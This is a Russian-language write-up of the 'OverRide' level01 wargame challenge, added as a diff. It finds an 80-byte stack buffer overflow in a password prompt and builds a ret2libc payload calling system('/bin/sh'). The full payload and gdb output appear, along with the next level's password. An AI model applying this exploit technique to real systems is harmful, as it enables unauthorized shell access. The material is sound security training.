@@ -1,0 +1,131 @@
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
+
+Partial RELRO - В этом режиме некоторые сегменты (включая .dynamic) будут помечены как доступные только для чтения после инициализации.
+No canary found - нет канареечной защиты
+NX enabled - стэк не является исполняемым
+No PIE - нет рандомизации базового адреса
+No RPATH  - нет жестких путей загрузки библиотек
+No RUNPATH - нет жестких путей загрузки библиотек
+
+objdump -d -M intel level01
+
+level01@OverRide:~$ readelf  -p .rodata level01
+
+String dump of section '.rodata':
+  [     8]  verifying username....^J
+  [    20]  dat_wil
+  [    28]  admin
+  [    30]  ********* ADMIN LOGIN PROMPT *********
+  [    57]  Enter Username:
+  [    68]  nope, incorrect username...^J
+  [    85]  Enter Password:
+  [    96]  nope, incorrect password...^J
+
+  readelf  -x .rodata level01
+
+Hex dump of section '.rodata':
+  0x08048688 03000000 01000200 76657269 6679696e ........verifyin
+  0x08048698 67207573 65726e61 6d652e2e 2e2e0a00 g username......
+  0x080486a8 6461745f 77696c00 61646d69 6e000000 dat_wil.admin...
+  0x080486b8 2a2a2a2a 2a2a2a2a 2a204144 4d494e20 ********* ADMIN
+  0x080486c8 4c4f4749 4e205052 4f4d5054 202a2a2a LOGIN PROMPT ***
+  0x080486d8 2a2a2a2a 2a2a0045 6e746572 20557365 ******.Enter Use
+  0x080486e8 726e616d 653a2000 6e6f7065 2c20696e rname: .nope, in
+  0x080486f8 636f7272 65637420 75736572 6e616d65 correct username
+  0x08048708 2e2e2e0a 00456e74 65722050 61737377 .....Enter Passw
+  0x08048718 6f72643a 20006e6f 70652c20 696e636f ord: .nope, inco
+  0x08048728 72726563 74207061 7373776f 72642e2e rrect password..
+  0x08048738 2e0a00                              ...
+
+  0x80486a8 = "dat_wil"
+
+  0x80486b0 = "admin"
+
+## objdump -z -D  intel level01
+получаем все пустые секции, находим переменную a_user_name и ее размер
+
+804a040:       00 00                   add    %al,(%eax)
+...
+804a0a2:       00 00                   add    %al,(%eax)
+
+Начинаем искать уязвимость.
+На уровне нет ничего что может явно хранить в себе пароль от следующего уровня.
+Так же нету вызова баша.
+Следовательно что то не так с fgets.
+Для этого подаем максимально возможные строки, которые поддерживает fgets.
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+При введение Username  256 символов программа не упала
+
+При введение Password 100 символов программа выдала 0x37634136 in ?? ()
+получаем смещение 80
+
+Если судить по дизасемблеру то размер буфера 64 // [esp+0x1c] +11 - +29 0x5c - 0x1c
+И из за этого возникает уязвимость
+
+x64 != 64
+
+
+## Начинаем разбор уязвимости:
+>> gdb ./level01
+>> r
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+воспользуемся ret2libc
+https://ru.wikipedia.org/wiki/Атака_возврата_в_библиотеку
+https://gist.github.com/selftaught/4ff7e46d0142e951f4b6008780ef0487
+
+Чтобы все библиотеки подгрузились, необходиомо запустить программу.
+Узнаем адрес system, "/bin/sh"
+ info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+нас интересует
+0xf7e6aed0  system = '\xf7\xe6\xae\xd0'[::-1]
+
+info proc map <--- чтобы узнать диапазон адресов по которым грузится библиотека
+
+        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+
+find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+
+0xf7f897ec = '\xf7\xf8\x97\xec'[::-1]
+
+собираем части
+python -c "print 'dat_wil\n' + 'A' * 80 + system + '0000' + '/bin/sh'"
+
+'0000' функция system принимает аргумент через 4 байта
+
+python -c "print 'dat_wil\n' + 'A' * 80 + '\xf7\xe6\xae\xd0'[::-1] + '0000' +'\xf7\xf8\x97\xec'[::-1]" > /tmp/exploit
+
+cat /tmp/exploit - | ./level01
+
+whoami
+level02
+cd ../level02
+cat .pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+level01@OverRide:~$ su level02
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
